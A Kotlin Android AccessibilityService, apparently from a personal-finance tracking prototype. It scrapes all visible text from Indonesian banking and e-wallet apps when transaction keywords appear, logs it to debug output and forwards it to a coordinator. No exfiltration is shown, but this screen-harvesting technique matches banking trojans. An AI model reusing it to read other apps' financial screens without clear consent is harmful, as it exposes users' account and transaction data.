package com.example.services

import android.accessibilityservice.AccessibilityService
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo

class FinanceAccessibilityService : AccessibilityService() {
    private val TAG = "FinanceAccessibility"

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.d(TAG, "Accessibility Service Terhubung")
        ServiceStateCoordinator.isAccessibilityServiceRunning.value = true
        ServiceStateCoordinator.addTerminalLog("AccessibilityService: AKTIF & Siap membaca layar perbankan.")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        val packageName = event.packageName?.toString() ?: ""
        
        // Kita menyortir window state change atau content changed
        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED || 
            event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
            
            val rootNode = rootInActiveWindow ?: return
            val sb = StringBuilder()
            scrapeTextFromNode(rootNode, sb)
            
            val screenText = sb.toString().trim()
            if (screenText.isNotEmpty()) {
                // Seleksi apakah aplikasi yang dibuka bernuansa keuangan/transaksi
                val isTargetApp = packageName.contains("dana", ignoreCase = true) ||
                        packageName.contains("gojek", ignoreCase = true) ||
                        packageName.contains("shopee", ignoreCase = true) ||
                        packageName.contains("ovo", ignoreCase = true) ||
                        packageName.contains("mcard", ignoreCase = true) || // BCA
                        packageName.contains("livin", ignoreCase = true)   // Mandiri
                
                // Cari pemicu khusus nominal transaksi (misalnya "nominal", "total bayar", "berhasil", "transfer")
                val containsKeywords = screenText.contains("total", ignoreCase = true) ||
                        screenText.contains("nominal", ignoreCase = true) ||
                        screenText.contains("bayar", ignoreCase = true) ||
                        screenText.contains("transaksi", ignoreCase = true) ||
                        screenText.contains("transfer", ignoreCase = true) ||
                        screenText.contains("rekening", ignoreCase = true) ||
                        screenText.contains("Rp", ignoreCase = true)

                if (isTargetApp && containsKeywords && screenText.length > 20) {
                    val message = "[$packageName Screen] $screenText"
                    Log.d(TAG, "Scraped Screen Content: $message")
                    // Supaya tidak spam terus-menerus, kita batasi frekuensi pengiriman per menit per aplikasi
                    // Untuk tujuan prototype, langsung proses ke coordinator!
                    ServiceStateCoordinator.processRawFinancialEvent(this, "LAYAR", message)
                }
            }
        }
    }

    private fun scrapeTextFromNode(node: AccessibilityNodeInfo, sb: StringBuilder) {
        val text = node.text?.toString() ?: ""
        if (text.isNotEmpty() && text.length < 150) { // filter out giant texts
            sb.append(text).append(" | ")
        }
        for (i in 0 until node.childCount) {
            val child = node.getChild(i)
            if (child != null) {
                scrapeTextFromNode(child, sb)
                child.recycle()
            }
        }
    }

    override fun onInterrupt() {
        Log.e(TAG, "Accessibility Service Terinterupsi")
        ServiceStateCoordinator.isAccessibilityServiceRunning.value = false
        ServiceStateCoordinator.addTerminalLog("AccessibilityService: Terinterupsi / Mati.")
    }

    override fun onDestroy() {
        super.onDestroy()
        ServiceStateCoordinator.isAccessibilityServiceRunning.value = false
        ServiceStateCoordinator.addTerminalLog("AccessibilityService: Hancur / Mati.")
    }
}
